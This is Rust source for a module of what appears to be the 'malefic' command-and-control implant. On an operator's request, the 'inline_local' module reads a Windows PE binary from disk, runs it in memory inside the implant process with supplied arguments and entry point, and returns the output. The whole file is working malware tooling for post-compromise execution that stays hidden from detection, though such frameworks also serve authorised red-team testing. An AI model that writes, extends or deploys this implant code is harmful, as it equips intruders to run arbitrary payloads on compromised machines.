#![allow(unused_assignments)]
use crate::{check_request, Module, Result, TaskResult};
use async_trait::async_trait;
use malefic_helper::common::format_cmdline;
use malefic_helper::to_error;
use malefic_helper::win::kit::pe::inlinepe::inline_pe;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::modulepb::BinaryResponse;
use malefic_trait::module_impl;
use std::ptr::null;
use malefic_helper::common::filesys::get_binary;

pub struct InlineLocal;

#[async_trait]
#[module_impl("inline_local")]
impl Module for InlineLocal {
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let (bin_content, bin_name) = to_error!(get_binary(&request.path))?;

        let parameters = if request.args.is_empty() {
            String::new()
        } else {
            format_cmdline(bin_name.clone(), request.args)
        };
        let result = unsafe {
            inline_pe(
                bin_content.as_ptr() as _,
                bin_content.len(),
                null(),
                null(),
                parameters.as_ptr() as _,
                parameters.len(),
                request.entry_point.as_ptr() as _,
                request.entry_point.len(),
                false,
                request.output,
                request.timeout,
            )
        };

        Ok(TaskResult::new_with_body(
            id,
            Body::BinaryResponse(BinaryResponse {
                status: 0,
                message: Vec::new(),
                data: result,
                err: String::new(),
            }),
        ))
    }
}
